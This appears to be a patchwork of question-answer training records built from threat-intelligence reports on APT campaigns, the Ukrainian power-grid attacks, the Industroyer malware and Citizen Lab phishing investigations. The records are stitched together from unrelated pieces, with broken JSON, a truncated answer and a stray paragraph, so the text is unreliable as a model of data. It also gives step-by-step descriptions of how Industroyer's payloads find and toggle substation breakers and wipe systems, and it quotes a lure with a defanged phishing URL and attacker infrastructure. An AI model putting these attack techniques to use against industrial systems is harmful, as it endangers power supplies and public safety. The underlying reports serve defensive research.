Canadian-related information, and requested assistance on outreach with one of the victims, namely the Indian government. At the same time, we independently explored whom we might contact in the Indian government, including making inquiries with Canada's Department of Foreign Affairs. By February 2010, we were able to find on our own what we thought was an appropriate contact in the Indian government, and gave a detailed notification to the National Technology Research Organization. Our notification for takedown of the command and control infrastructure came later in the investigation, after we had collected and analyzed all of the information related to this report, but prior to its release.\nOur experiences illustrate the intricate, nuanced and often confusing landscape of global cyber security notification practices. The notification process will continue after the publication of this report.\nShadows in the Cloud points to a disturbing complex ecosystem of malware. Although malware networks, cyber crime and espionage have been around for years, the evidence presented here shows how these networks can be aggressively adaptive systems, multipying and regenerating across multiple vectors and platforms, and exploting the vulnerabilties within the latest Web 2.0 technologies to expand their reach and impact. Although there is rich detail to what is uncovered in the Shadow investigation, so much of the origins, architecture and aims of these networks ultimately remain a mystery and await further investigation and analysis. However, even with the partial insights and fleeting glimpses acquired here, we can draw some conclusions and implications for further research, policy and operations.\nFirst, the research here shows, as with Tracking GhostNet, how even a relatively small research sample \u2014 in this case Tibetan organizations \u2014 can expand, upon investigation and analysis, into an astonishingly large pool of victims. The connections drawn out here beg the question of what would emerge if the research began with a different group, from a different region of the world, with a different target set of compromised actors? Clearly, an area of methodological advantage for both the Tracking GhostNet and the Shadows in the Cloud investigations was to have access in the field to compromised computers and be able to work outwards in a structured and systematic fashion, using a combination of technical investigations and data analysis. An area of further research is to extend such efforts to other locations in other regions of the world. Such investigations may reveal other malware networks, or entirely new and unanticipated modes of crime and espionage.\nSecond, Shadows in the Cloud underscores the extent to which the global networked society into which we have evolved socially, politically, economically, and militarily carries with it an underground ecoystem that is equally networked, though far less visible to those whom it compromises. Governments, organizations and other actors around the world have been quick to adopt computerized public and administration systems, including state security actors. Their investments into these technologies have developed at a much faster rate than the appropriate security policies and practices (Deibert and Rohozinski 2010).\nAlthough the Government of India was the most victimized according to what we uncovered in Shadows in the Cloud \u2014 and that certainly should yield a major consideration of public policy and security for that country \u2014 observations about India in this respect need to be qualified in at least two ways. First, Shadows in the Cloud reports only on observations and existing evidence, which by definition remain partial. There could be other countries victimized, involving these very same malware networks attackers, but of which we are unaware because of our limited samples. Second, and most importantly, there are numerous other countries and international organizations that are targeted here, perhaps not to the same extent, but targeted and infiltrated nonetheless. We can only infer what type of data was exfiltrated from these other actors that is of strategic value. Overall, however, the key point to draw is that networked societies can be compromised through networks in which they are invariably linked and mutually dependent.\nThird, and related, Shadows in the Cloud demonstrates clearly the potential for collateral compromise, one of the key hypotheses informing our research framework. This investigation indicates that data leakage from malware networks can compromise unwitting third parties who are not initially targeted by the attackers. Data contained on compromised machines can also contain valuable information on third parties that while on its own may not be significant, but when pieced together with other information can provide actionable and operational intelligence. The policy and operational implications of collateral compromise are serious and wide-ranging, and reinforce that security is only as strong as the weakest link in a chain. In today's networked world, such chains are complex, overlapping and dispersed across numerous technological platforms crossing multiple\nnational jurisdictions. Paying attention to domestic cyber security is therefore only a partial solution to a much wider problem. Today, no country or organization is a secure island in the global sea of information.\n\nWhat challenges did the authors face when notifying governments, businesses, NGOs, and individuals about being compromised by the Shadow APT, and how did they address these challenges?",
    "output": "The authors faced challenges such as the sensitivity of notifying governments about classified documents or national security concerns, identifying the appropriate point of contact within organizations, and the potential for jeopardizing third-party security or causing retaliation. They addressed these challenges by conducting thorough research, seeking counsel from organizations like the Shadowserver Foundation, and making deliberate and self-conscious decisions about timing and contacts.",

We have the impression that a cybersurveillance operation is underway (and is probably still ongoing - most recent sample created Oct. 31) which was first mainly focused on Palestinian targets, then shifted towards Israel. The reason for the shift is unknown. Maybe it was planned all along; or caused by changes in the political climate; or maybe the first half of the operation found data that caused the target change.\nThis analysis is almost exclusively based on the executable files themselves. We have very little information about actual infections. The only documented case is the Benny Gantz-themed email which triggered the investigation. We consider it likely that other attacks have been modeled the same way, using attachments in email. These attachments may often have consisted of the described malicious files inside archives like RAR or ZIP.\nThe attacker is still unknown to us. There are probably several actors that could have an interest in the regional politics, as the various powerblocks in the region are manifold and conflicted. By using largely off-the-shelf malware, the cost of mounting such an operation is considerably lower than for those who do their own malware development.\nQuestion: Why might the cybersurveillance operation have shifted its focus from Palestinian targets to Israeli targets? Discuss potential reasons and the implications of this shift.",
    "output": "Answer: The shift in focus from Palestinian targets to Israeli targets could be attributed to several factors. One possibility is that the shift was part of the original plan and was always intended to occur. Another potential reason could be changes in the political climate, which might have made Israeli targets more strategically valuable. Additionally, the initial phase of the operation focusing on Palestinian targets might have yielded information that prompted the attackers to pivot towards Israeli targets. This shift underscores the adaptability of the threat actors and their ability to adjust their tactics based on evolving intelligence needs or political dynamics.",

The resulting reports were part of the Threat Monitoring service offered to paying Sentryo customers. Following the second wave of attacks in December 2016, the Sentryo team has decided to publish a public version of this report to share this review. This also includes a technical part on the newly found malware called INDUSTROYER/CrashOverride supposedly used during the second attack. This article also includes a section about the NotPetya attack which recently targeted many Ukrainian businesses and companies doing business with Ukraine.\nIT cybersecurity analysts tend to look at the attack vectors in depth. They provide great details about the way attacks are developed focusing on the technical perspective. Is the design well made? Does it embed lots of different hacking techniques (0day, obfuscation, etc.)? We think this approach is misleading in the growing field of OT Monitoring cybersecurity. Attack vectors are definitely part of the problem but their physical impact must be careful analysed. OT impacts safety, health and environment where IT is about data. OT impact is about casualties not only money and data losses.\nMoreover, fear mongering (i.e. tricks to have fear drive the sales process) is not part of the Sentryo culture. That's why we are being very careful and trying to distinguish what can be taken as true from what is, because there is no other evidence, pure speculation. In this document, the reader will have an overview of Facts and Claims made in the cybersecurity community and Sentryo's views on the subject. Our goal is also to share our analysis to the whole SCADA/ICS/DCS/OT security community. Threat intelligence shall be seen as an ongoing public debate between different skilled experts such as instrumentation engineers, control engineers, cybersecurity experts, CISOs, forensics gurus, etc.\nWe welcome any feedback or updates to this document and will definitely include all evidence that is lacking in this version. This document also includes a great contribution that will stress the need for more Threat Information Sharing. We warmly thank its author.\nTo ease the reading and provide a quasi executive summary, we will start with a detailed potential scenario of the first 2015 attack which has been documented. Please note that 2016 incidents do not have enough documentation to provide such a scenario description. It should also be noted that the attack campaign has apparently continued since early january 2017 with new technical elements coming to light regularly. Check out the Sentryo website to download the latest version.\nAt Sentryo, we remain committed to helping industrial asset owners, including when they face a crisis. Do not hesitate to contact us!\nEXECUTIVE SUMMARY: POTENTIAL SCENARIO FOR THE FIRST ATTACK\nFACTS & REPORTS\n2017ANOTHER MASSIVE INFECTION\"NOTPETYA\"\nCLAIMS\nUSING SENTRYO ICS CYBERVISION TO COPE WITH SUCH ATTACKS\nTHE NEED OF THREAT INFORMATION SHARING BY VYTAUTAS BUTRIMAS\nLes contributeurs :\nLaurent Hausermann - Sentryo Co-founder & COO  /  Patrice Bock - Sentryo Customer Success Manager Romain Francoise - Sentryo CTO  /  Antoine de Nervaux - Sentryo Security Engineer\nBig Headline: DUE TO THE ANALYSIS AND DATA DEVELOPED IN THE PRESENT DOCUMENT,WE ARE ABLE TO DESCRIBE THE MOST PROBABLE ATTACK SCENARIO. INDEED,IT APPEARS THAT IT WAS TARGETING THE CORE OF THE INDUSTRIAL NETWORK:\nThe scale of the attack was able to cut power in a whole geographic area of Ukraine as three independent electricity distributors were simultaneously attacked.\nThey also used hacking techniques to support and amplify the cyberattack. Their goal was clearly to stop, or at least slow down, operations during the power restore processes.\nFinally, they performed a telephone denial-of-service attack on the call center. Citizens were not able to call their power operator thus amplifying an already chaotic situation.\nThe impact of this attack was that more than 50 substations went offline and more than 200,000 homesremained without electricity for a period of time. Ukrainian operators were able to restore power after 6 hours using manual on-site switches like in \"the old days\".\nTHE DECEMBER 23 OUTAGE AT WESTERN UKRAINE'S PRYKARPATTYAOBLENERGO/ IVANO-FRANKIVSK PLANT CUT POWER TO MANY CUSTOMERS FOR ABOUT SIX HOURS. REPORTS VARY FROM 80,000 TO 1.4 MILLION CUSTOMERS IMPACTED.\nBig Headline: THEY FOUND THAT:\n1 The malware was distributed by a \"dropper\". This dropper was an Excel macro embedded in a malicious spreadsheet file.\n2 An updated analysis found that there was also an alternate attack based on a Microsoft Word Document embedding macros.\n3 In reports about the December 2015 attack, the \"dropper\" used a variant of the Black Energy (3rd version) trojan (also called Lancafdo by Symantec). Black Energy is not a new malware. It's been used since 2007 in various campaigns including a famous one in 2014 against energy companies. Black Energy enables attackers to control their malware via a control center (C&C or C2) and enables them to do horizontal propagation (moving from one computer to another).\n4 In reports about a replica attack performed in January 2016 (see next page for more details), the compromission chain was different and Black Energy was replaced by a custom-made malware payload based on a variant of the open-source gcat backdoor. Incidentally, the spear phishing email contained an invisible PNG image to track when the victims viewed the email and the PNG was hosted on a server located in France and hosted\nby Online SAS.The IP pointed to a domain name associated with a Hong Kong company which was probably a collateral victim in this case (compromised web server).\n5 In the December campaign the attackers launched a \"wiper\" named \"KillDisk\" or \"Disakil\". This wiper is a destructive malware. It is able to kill processes and services on a server and also wipe (i.e. format) the whole hard disk.\n6 A known \"feature\" of Disakil is to stop and delete a named service and write its corresponding executable file on the hard drive with random data in order to make restoration of the system more difficult. Disakil was used against the service called \"sec_service.exe\". This service appears to belong to 'Serial to Ethernet Connector' software by Eltima. This software allows access to remote serial ports over network connections. These kinds of \"remote serial\" connections are used to pilot PLCs or RTUs which do not have a way to connect via Ethernet (via a dedicated module). This is quite common in old installations that were deployed before 2000.\n7 As of April 2016, it is still unclear if the attack itself (breaker opening) was performed remotely using a\ndigital / computerized weapon or was the result of a human and operational lapse but the likelihood of a digital weapon is high.\n8 The organization NATO Cooperative Cyber Defence Centre of Excellence (CCD COE) has published a book called \"Cyber War in Perspective: Russian Aggression against Ukraine\". From this book, a presentation at the BlackHat 2016 conference was performed: \"Cyber War in Perspective: Analysis from the Crisis in Ukraine\" by Kenneth Geers. This talk added some interesting points to this analysis. Mainly, the goal was also to steal VPN credentials to SCADA; to change passwords to access to the electric grid; to disable the backup power; to overwrite the serial-to-ethernet converter firmware; to open 3 circuit breakers; to launch the killdisk and to TDoS (Telephony Denial of Services) customer call center. The impact was more than 50 substations offline and more than 200,000 homes without electricity.\n\nQuestion: According to the analysis by the NATO Cooperative Cyber Defence Centre of Excellence (CCD COE), what were the specific objectives of the attackers in the December 2015 attack on the Ukrainian power grid?\n\nAnswer:",
    "output": "The NATO Cooperative Cyber Defence Centre of Excellence (CCD COE) reported that the goals of the attackers included stealing VPN credentials to SCADA, changing passwords to access the electric grid, disabling the backup power, overwriting the serial-to-ethernet converter firmware, opening 3 circuit breakers, launching the KillDisk malware, and performing a Telephony Denial of Service (TDoS) attack on the customer call center. The impact was severe, with more than 50 substations going offline and over 200,000 homes left without electricity.",

Keyboard language settings in the code or file names can reveal the attackers' nationality. Strings left in the code can provide insights into the development environment and available resources. The specific targets or non-targets of the group, especially in the case of nation-state actors, can reveal the adversary's agenda. Additionally, the infrastructure, domain, and network of attackers can indicate their location, resources, and level of sophistication. Finally, the type of information stolen and how it is used (sold, utilized, or stored) can further assist in profiling the adversary.

    "instruction": "Big Headline: Case expansion through domain usage and registrations\nIn almost all cases, the domains registered by the attackers are \"privacy protected\". This means that the registrant has paid the domain registrar to withhold identity information related to the registration. This is done almost to perfection. Another feature is that almost all websites belonging to this attacker has their robots.txt set to \"disallow\" to stop them from being crawled.\nHowever, by searching historical IP data for the IP addresses of domains known to be involved we found a number of other domains likely belonging to the same infrastructure. These domains were then further verified against malware samples to ascertain valid connection to attackers. Some care needs to be taken when working with IP addresses, as there are possibilities of false correlations on, for example, domain parking IP addresses, sinkholes and webhosting servers.\nIP history on researcherzone.net. Source: DomainTools\nA selection of passive DNS data on just one of the known IP addresses which was known to have served malware (1)\nAdditional data may be gleaned by querying the IP addresses themselves. Many have set up a default ESMTP (mail) server on port 587/tcp, which responds with a configured banner. For example, the domain onlinestoreapp.net (used by malware MD5 a7b5fce4390629f1756eb25901dbe105) resolved to the IP address 37.59.231.161, and this happens when connecting to that IP on ESMTP:\n$ telnet 37.59.231.161 587\nTrying 37.59.231.161...\nConnected to 37.59.231.161.\nEscape character is '^]'.\n220 server.enlighten-energy.org ESMTP Exim 4.80.1 Sat, 23 Mar 2013 16:44:44 -0400\nenlighten-energy.org is another of the known bad domains used against Telenor.\nAll of this enabled us to draw a domain map over the infrastructure (next page). This map is probably larger than shown here; there might be domains owned by the attackers that are not plotted on this map because we could not prove they were malicious, and many domains we have not found yet. Conversely, many of the domains plotted were used in attacks years ago and may never be again.\nAbove: Domain map of the attack infrastructure. Yellow and orange nodes constitute domains, where the orange have been verified malicious and yellow are likely malicious. Blue nodes are IP addresses, and purple are autonomous systems (AS). Green nodes are domains that are not part of any attack pattern, but are interesting in this context. Red nodes show connections to known or likely attacks.\n\nAnswer this question based on the above context: What methodologies were employed to expand the investigation into the APT's infrastructure, and how were potential false correlations mitigated during this process?",

    "instruction": "Big Headline: 61850 payload component\nUnlike the 101 and 104 payloads, this payload component exists as a standalone malicious tool comprising an executable named 61850.exe and the DLL 61850.dll  It is named after the  standard  This standard describes a protocol used for multivendor communication among devices that perform protection, automation, metering, monitoring, and control of electrical substation automation systems  The protocol is very complex and robust, but the 61850 payload uses only a small subset of the protocol to produce its disruptive effect\nOnce executed, the 61850 payload DLL attempts to read the configuration file, the path to which is supplied by the Launcher component  The standalone version defaults to reading its configuration from i.ini  The configuration file is expected to contain a list of IP addresses of devices capable of communicating via the protocol described in the IEC 61850 standard\nIf the configuration file is not present, then this component enumerates all connected network adaptors to determine their TCP/IP subnet masks  The 61850 payload then enumerates all possible IP addresses for each of these subnet masks, and tries to connect to port 102 on each of those addresses Therefore, this component has the ability to discover relevant devices in the network automatically\nOtherwise, if a configuration file is present and it contains target IP addresses, this component connects to port 102 on those IP addresses and on IP addresses that were discovered automatically\nOnce this component connects to a target host, it sends a Connection Request packet using the Connection Oriented Transport Protocol, as seen in Figure 12\nIf the target device responds appropriately, the 61850 payload then sends an InitiateRequest packet using the (MMS)  If the expected answer is received, it continues, sending an MMS getNameList request  Thereby, the component compiles a list of object names in a Virtual Manufacturing Device (VMD)\nNext, this component enumerates the objects discovered in the previous step and sends the device domain-specific getNameList requests with each object name  This enumerates named variables in a specific domain\nAfterwards, the 61850 payload parses data received in response to these requests, searching for variables that contain following combinations of strings:\n\u2022 CSW, CF, Pos, and Model\n\u2022 CSW, ST, Pos, and stVal\n\u2022 CSW, CO, Pos, Oper, but not $T\n\u2022 CSW, CO, Pos, SBO, but not $T\nThe string CSW is a name for logical nodes, which are used to control circuit breakers and switches\nFor variables that contain the Model or stVal string the 61850 payload sends an additional MMS Read request  For some of the variables this component may also issue an MMS Write request that will change its state\nThe 61850 payload produces a log file of its operations that contains the IP addresses, MMS domains, named variables and the node states (open or closed) of its targets\nBig Headline: OPC DA payload component\nThe OPC DA payload component implements a client for the protocol described in the  specification  is a software standard and specification that is based on Microsoft technologies such as OLE, COM, and DCOM  The Data Access (DA) part of the OPC specification allows real-time data exchange between distributed components, based on a client\u2013server model\nThis component exists as a standalone malicious tool with the filename OPC.exe and a DLL, which implement both 61850 and OPC DA payload functionalities  This DLL is named, internally in PE export table, OPCClientDemo.dll, suggesting that the code of this component may be based on the open source project\nThe OPC DA payload does not require any kind of configuration file Once executed by the attacker, it enumerates all OPC servers using the ICatInformation::EnumClassesOfCategories method with CATID_ OPCDAServer20 category identifier and IOPCServer::GetStatus to identify the ones running\nNext the component uses the IOPCBrowseServerAddressSpace interface to enumerate all OPC items on the server  Specifically, it looks for items that contain the following strings in their name:\n\u2022 ctlSelOn\n\u2022 ctlOperOn\n\u2022 ctlSelOff\n\u2022 ctlOperOff\n\u2022 \\Pos and stVal\nThe names of these items may suggest that attackers are interested in OPC items provided by OPC servers that belong to solutions from , such as their  Figure 15 demonstrates an example list of OPC items that contain names with similar strings  This list of OPC items is received by the OPC Process Objects List Tool from ABB\nThe attackers use the string Abdul when they add a new OPC group Possibly this string is used by the attackers as a slang term when referring to the ABB solutions\nOn the final step, the OPC DA payload attempts to change the state of discovered OPC items using the IOPCSyncIO interface by writing the 0x01 value twice\nThe component writes the OPC server name, OPC item name state, quality code and value to the log file  The logged values are separated with the following headers:\n\u2022 [*ServerName: %SERVERNAME%] [State: Before]\n\u2022 [*ServerName: %SERVERNAME%] [State: After ON]\n\u2022 [*ServerName: %SERVERNAME%] [State: After OFF]\nBig Headline: Data wiper component\nThe data wiper component is a destructive  module that is used in the final stage of an attack  The attackers are using this component to hide their tracks and to make recovery difficult\nThis component has the filename haslo.dat or haslo.exe and can be executed by the Launcher component or used as a standalone malicious tool\nOnce executed it attempts to enumerate all keys in the registry that list Windows services:\n\u2022 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\nIt attempts to set the registry value ImagePath with an empty string in each of the entries found  This operation will make the operating system unbootable\nThe next step is actual deletion of file contents  The component enumerates files with specific file extensions on all drives connected to computer, from C:\\ to Z:\\  It should be noted that during enumeration the component skips files that are located in subdirectory that contains Windows in its name\nThe component rewrites file content with meaningless data obtained from newly allocated memory  In order to perform this operation thoroughly the component attempts to rewrite files twice  The first attempt happens once the file is found on a drive  If the first attempt is unsuccessful then the wiper malware makes a second attempt, but before that the malware terminates\nall processes except those included in a list of critical system processes  The list of these processes is displayed in Figure 18\nTo speed up the wiping operation this component rewrites only partial file content at the beginning of the file  The amount of data to be rewritten depends on file size: the smallest amount of data will be rewritten for files less than or equal to 1Mb (4096 bytes); the largest amount of data will be rewritten for files less than or equal to 10Mb (32768 bytes)\nFinally, this component attempts to terminate all processes (including system processes) except its own  This will result in the system becoming unresponsive and eventually crashing\nThe filename masks targeted by the data wiper component to be overwritten are:\nThis list contains filename extensions that are used in a standard environment, such as Windows binaries ( exe/ dll), archives ( 7z / tar/ rar/ zip), backup files ( bak/ bk/ bkp), Microsoft SQL server files ( mdf/ ldf), and various configuration files ( ini/ xml)  In addition, the component also wipes files that may be used in industrial control systems, such as files written using  ( scl/ cid/ scd) and there are many files and file extensions that are used by various products from ABB  For example, a file named SYS_BASCON.COM is used by ABB solutions for storing configuration data, and files with the .paf (Product Authorization File) filename extension are used to store license data for ABB MicroSCADA products\nBig Headline: Additional tools: DoS tool\nAnother tool from the attackers' arsenal is a Denial-of-Service (DoS) tool that can be used against Siemens SIPROTEC devices  This tool leverages the  vulnerability in order to render a device unresponsive Once this vulnerability is successfully exploited, the target device stops responding to any commands until it is rebooted manually\nTo exploit this vulnerability the attackers hardcoded the device IP addresses into this tool  Once the tool is executed it sends specifically crafted packets to port 50,000 of the target IP addresses using UDP  The UDP packet contains only 18 bytes\nBig Headline: Conclusion\nThe investigation behind the Ukrainian power outage last December is still ongoing and it is currently not confirmed that the malware analyzed here was the direct cause  Nevertheless, we believe that to be a very probable explanation, as the malware is able to directly control switches and circuit breakers at power grid substations using four ICS protocols and contains an activation timestamp for December 17, 2016, the day of the power outage\nWe can definitely say that the Win32/Industroyer malware family is an advanced and sophisticated piece of malware that is used against industrial control systems  However, it should be noted that the malware itself is just a tool in the hands of an even more advanced and very capable malicious actor  Using logs produced by the toolset and highly configurable payloads, the attackers could adapt the malware to any comparable environment\nThe commonly-used industrial control protocols used in this malware were designed decades ago without taking security into consideration Therefore, any intrusion into an industrial network with systems using these protocols should be considered as \"game over\"\n\nQ: How does the OPC DA payload component of Win32/Industroyer identify and interact with specific OPC items on the server?",
    "output": "A: The OPC DA payload component identifies specific OPC items by enumerating all OPC servers and using the IOPCBrowseServerAddressSpace interface to enumerate all OPC items on the server. It looks for items that contain strings like 'ctlSelOn', 'ctlOperOn', 'ctlSelOff', 'ctlOperOff', '\\Pos', and 'stVal' in their names. It then attempts to change the state of these items using the IOPCSyncIO interface by writing the 0x01 value twice.",

    "instruction": "Context: Big Headline: The Nile Phish Campaign\nIn late 2016, Citizen Lab was contacted by the Egyptian Initiative for Personal Rights (EIPR), whose technical team had observed a growing number of suspicious emails sent to EIPR accounts. The messages had caught the attention of the technical team because multiple messages arrived at the same time, concerned current events, and seemed to play on emotional themes related to Case 173. EIPR's team helped broaden the investigation to a total of seven targeted Egyptian NGOs.\nAll of the seven Egyptian organizations are also implicated by Case 173. The targets include reputable and respected organizations working on political and rights issues such as freedom of expression, gender rights, and victims of torture and forced disappearances. Six of the organizations have agreed to be named in this report and one requested to be referenced anonymously (see Table 1).\nTable 1: Egyptian NGOs Known to be Targeted by Nile Phish\nIn addition to the organizations, we identified a small number of individual targets in Egypt, including well-respected lawyers, journalists, and activists.\nWe strongly suspect that there may be other targets, and hope that the Indicators of Targeting that we provide in Appendix A can be used by systems administrators and others to seek evidence of targeting.\nMedium Headline: How The Investigation Began\nThe first Nile Phish message that we examined, sent by Nile Phish to several Egyptian NGOs on November 24, 2016, was made to appear to come from the Nadeem Center for Rehabilitation of Victims of Violence (Nadeem), and invited the NGO staff member to participate in a nonexistent panel discussing Egypt's draft NGO Act, which was nearing a vote in Parliament. The recipient was invited to visit a link to read more about the panel.\nThe operators used language from a (<http://eipr.org/en/press/2016/11/political-parties-and-civil-society-organizations-reject-new-associations-law>)real NGO statement that had been circulating, embellishing it with the fake meeting. According to the carefully crafted fiction, the event was co-sponsored by several other NGOs, including EIPR, the Cairo Institute for Human Rights Studies (CIHRS) and Nazra for Feminist Studies (Nazra). These NGOs were signatories of the legitimate statement. Interestingly Nadeem, EIPR, CIHRS, and Nazra were all later targeted by the same phishing campaign.\nNov 24 Message Excerpt (Translated)\"\u2026The state has already taken real steps to eliminate Egyptian civil society organizations by prosecuting case no. 173/2011 on foreign funding, and several organizations and their current and former directors have been banned from travel and have had their assets frozen. This new law, however, would pave the way for the eradication of any sort of civic action geared to development, charitable activities, and services..\n\u2026Therefore, El Nadeem will organize jointly with political parties and ngos a panel to discuss the status of the civil society organizations in Egypt in the light of the new act beside the restrictions practiced by the security authorities such as travel ban and assesses free, and others restrictive to societal and development work in Egypt.\n[Link to the agenda and to register for the event]\nThe link led to a site designed to trick the target into believing that they needed to enter their password to view the file. After confirming that the message was a phishing attack, we began investigation in close collaboration with EIPR's technical team, which was by then observing a second wave of messages claiming to share a document that listed individuals subject to travel bans. The recipients were the staff of Egyptian civil society organizations, many of whom suspected that they might be included on these lists.\nWe have now documented at least 92 messages from Nile Phish, which we link together by use of the same servers and phishing toolkit. The majority of the emails were sent to the work accounts of the targets. The messages have targeted at least seven organizations, as well as a number of individual activists, lawyers, and journalists. Almost all of the targets are staff of organizations that are defendants in Case 173.\nThe campaign falls into two phases, which map both onto phishing style, and to different server infrastructure (See: Nile Phish Infrastructure)\nMedium Headline: What is Phishing?\nPhishing is a tactic to steal personal information, like passwords, through deception. Many phishing emails often try to trick you into entering passwords and other secret codes into websites that look legitimate, but are really fake.\nWhile phishing can be used by criminal gangs to steal bank information and for other financial crimes, phishing is also used for espionage and surveillance. For example, the Nile Phish operation seems to be designed to gain access to email accounts and document sharing files belonging to NGOs.\nMedium Headline: Late November- Late December 2016\nIn the first phase of the phishing (approximately November 24-December 26, 2016) a majority of the messages were crafted with references to the ongoing crackdown on civil society, and especially Case 173. Typically, the messages masqueraded as document shares, primarily via Google or Dropbox, containing highly relevant or sensitive information.\nThe following example of a phishing email that leveraged a recent arrest of a prominent Egyptian lawyer as a lure, illustrates that the phishing was both extremely timely, and conducted by those well aware of the activities of the Egyptian government. Specifically, it suggests that within a few hours of an arrest, the operator of the campaign was using this event as part of their phishing attack.\nAnswer this question: How did the Nile Phish campaign leverage current events and emotional themes to target Egyptian NGOs, and what specific tactics were employed in the first phishing message examined?",
    "output": "The Nile Phish campaign leveraged current events and emotional themes related to Case 173 to target Egyptian NGOs.

It takes time, organization, skill, and resources to successfully deploy coordinated attacks against high profile infrastructures such as Google.\nClearly, the increasing wealth of information stored in the cloud2 (<>)is becoming an attractive target. The emerging world of cyberspace is now at war against cybercriminals and those conducting cy-berwarfare [7] [8]. Sophisticated attacks exploiting unknown software vulnerabilities as means of entry point provides an advantage for attackers to silently infiltrate and perform various forms of spying including the ability to deploy video and audio surveillance, and the probing and stealing of sensitive desired information. Hydraq's communication protocol is carefully crafted and researched making it difficult to detect and recognize an on-going attack over the network. The level of detail of the backdoor commands allow a remote attacker to perform the necessary tasks using a smaller resource footprint.\nIn conclusion, the emergence of this type of sophisticated offensive capability will continue to pose challenges for cyberspace security defenses. By exposing the intricate details of Hydraq, we hope to assist and contribute to overall cyber security learning and awareness.\n2 Cloud refers to services accessed and stored on the internet cloud.

Your security scanner must be always turned on and up-to-date with the latest signature. Real-time scanning protects you from possible infection that you may get from compromised Websites, network shares, email and flash drives.\n2. Turn on your firewall. Your firewall provides a different layer of security that guards you from network attacks and blocks unauthorized access to your machine. A firewall with real-time malware behavior intrusion detection could prevent or lessen the impact of malware infection.\n3. Turn on Data Execution Prevention (DEP). This feature is available in Windows XP SP3, Windows Server 2003, Windows Server 2008, Windows Vista and Windows 7. Refer Microsoft instruction on how to configure memory protection in Windows XP SP 2 at\n4. Increase your browser security settings. You can refer CERT Web browser security tips at\nMedium Headline: Be Security-Aware\n1. Do NOT open email from people you don't know. Think twice and verify before clicking a URL or open an attachment. Don't be click happy! All it takes is a moment of inattention.\n2. Implement strong password. Refer to these Microsoft Tips for creating a strong password:\n3. When conducting online banking or financial transaction, make sure your browser connection is secure.\n4. Encrypt online communication and confidential data.\n5. Back up your important data. Keep a copy of all your files and store them separately.\n6. Be cautious about instant messaging. Avoid chatting with people you don't know, especially if they ask for personal information such as photos or want you to do something for them.\n7. Protect your identity while enjoying online social networking activities. Be wary of clicking links or suspicious profiles. Double-check the integrity of the connection or friend request before adding anyone to your network. Avoid installing extras such as third-party applications; they may lead to malware infection, or attackers could use them to steal your identity.\n8. Avoid piracy by downloading from secure sources.\n9. Avoid threats that use social engineering techniques by checking user feedback about a Web site before visiting it, and reader feedback about an application before installing it.\n10. If you are using Adobe PDF Reader, prevent your default browser from automatically opening PDF document. Refer to our CA Security Advisor research blog entry at\n11.

Please contact me again at the end of this month. Thank you.2017-02-13 18:34 GMT-08:00 papa papa hellomice@mail.com\nI would like to expose some materials to you. It is about the insider information of Guo Yungui's claim that Chinese hackers attacked Ming Jing News. hXXp://43.240.14.37/asdasdasadqddd12222111[.]php/article.asp=search.php\nLater on the same day, the phishing pages and log files were taken offline serving a 404 error if visited. The bare IP of the server (43[.]240[.]14[.]37) also switched to returning a default CentOS test page. After the site was taken down on February 28 no additional phishing emails were sent and we observed no other activity.\nAnalysis of passive DNS records and WHOIS registration information associated with the server infrastructure used to host the fake CDT page led to the discovery that the phishing operation targeting CDT was part of a wider campaign.\nMedium Headline: Infrastructure Connections\nAfter examining the server used to host the fake CDT page and referencing passive DNS records and WHOIS registration information, we found other fake domains registered by the same entity with copied content from Chinese-language news sites. Our analysis shows that the operators are using the fake domains for at least three different purposes: reconnaissance, phishing, and malware. We were only able to collect phishing emails sent to CDT and cannot confirm if the other media organizations were direct targets or if the fake domains were used to target other groups. Table 1 provides an overview of groups that the operator attempted to mimic through fake domains and / or copied content.\nThe fake domains are linked by common WHOIS registration information, which shows they were all registered by the same entity. The WHOIS registration information used to register the fake CDT domain is as follows:\nName: free tibet\nMailing Address: Uniter states, Phoenix Arizona 86303\nUS\nPhone: +1.2126881188\nEmail: aobama_5@yahoo.com\nWe found a series of domains registered with the same information. The majority of these domains are designed to mimic domains of Chinese-language news sites. We resolved each domain to determine if they are active and which IP they resolve to (see Table 2).\nThe registration dates show the operators have been registering fake domains that mimic Chinese language news websites since 2015, when they registered domains made to look like the real domain of news site Bowen Press ( bowenpress[.]com).\nWe investigated the servers hosting the domains and found the operators use two servers for different purposes: one for phishing and reconnaissance activities and another to serve malware.\nThe phishing and reconnaissance server hosted the fake CDT domain, the fake Mingjing page, and a domain made to look like the legitimate domain of Epoch Times (a multilingual media organization started by Chinese-American Falun Gong supporters.\nOn February 26 2017, the operators registered a fake domain mimicking the main Epoch Times domain (epochtimes[.]com), which adds an additional 'a' after 'epoch' (epochatimes[.]com).\nFollowing our discovery of the fake Epoch Times domain we notified the organization and shared indicators of compromise. Epoch Times found a Cloudie IP (103.200.31[.]164) that sent 24,183 requests during a 12 hour period on March 8, 2017 to the subscription page of Epoch Times at the URL subscribe.epochtimes.com. These requests appear to be attempts to enumerate HTTP paths, similar to the requests sent to China Digital Times on February 8.\nGiven the timeframe of the registration of the fake Epoch Times domain, we suspect the operators may have moved from targeting CDT to Epoch Times. The fake Epoch Times domain was hosted on the same server as the fake CDT and Mingjing pages (43.240.14[.]37). However, we did not find content copied from any Epoch Times websites on the operator's infrastructure during the investigation and did not have any phishing emails reported to us. It is possible that the fake Epoch Times domain is being used for phishing or reconnaissance, but we are unable to confirm.\nIn addition to phishing and reconnaissance activities the operators are also engaged in malware operations and have a dedicated server for this purpose. We discovered the malware server by resolving the domain: datalink[.]one, and found it hosted NetWire, a commodity remote access trojan, and included bait content and\ndomains designed to mimic Chinese-language news organizations HK01 and Bowen Press.\nBig Headline: Part 3: Malware Operation\nThis section describes a malware operation that used content and domains made to mimic Chinese-language news organizations HK01 and Bowen Press. The malware operation made efforts to evade detection and frustrate analysis. The operation combined obfuscated, packed executables, and custom shellcode with an additional step of using compromised servers to host the malicious payload. We identify the payload as NetWire, a commodity remote access trojan that is not commonly observed in Asia and typically seen used in cybercrime activities.\nMedium Headline: Malware server and analysis\nOur investigation of the malware operation began with analysis of the server used to host the malware. The malware server is on the IP address: 23[.]239[.]106[.]119 hosted by GorillaServers, a provider based in the United States. We found the server by resolving the domain datalink[.]one, which was one of the domains registered by the operators.\nOn the server we found domains and copied content mimicking HK01 and Bowen Press, but cannot confirm if these groups were direct targets of the malware operation or if the content was used as lures to target other groups.\nPassive DNS records for the IP address: 23[.]239[.]106[.]119 show a number of other domains that we have connected to the operators including:\nWe found that some of these domains were used as command and control servers for the malware we found hosted on the domain.\nSmall Headline: HK01 Lure\nWhen we first investigated the malware server on 